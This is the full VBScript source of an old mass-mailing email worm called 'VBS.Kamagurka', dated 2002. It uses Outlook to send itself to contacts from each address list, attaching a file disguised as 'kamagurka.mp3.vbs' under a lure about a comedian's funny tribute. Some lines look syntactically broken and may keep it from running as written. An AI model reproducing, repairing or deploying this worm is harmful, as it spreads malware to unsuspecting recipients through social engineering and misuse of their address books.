'VBS.Kamagurka by Negral (c)2002
On error resume next
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
Set q = Count
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.q
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.q
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 51 Then oo = d.AddressEntries.q
Next
c.Subject = "Great comedian"
c.Body="Ever heard of the commedian Kamagurka? Listen to the attachement for his funny tribute to the world." 
c.attachments.Add (c:\kamagurka.mp3.vbs)
c.Send
e = ""
Next
b.Logoff
End If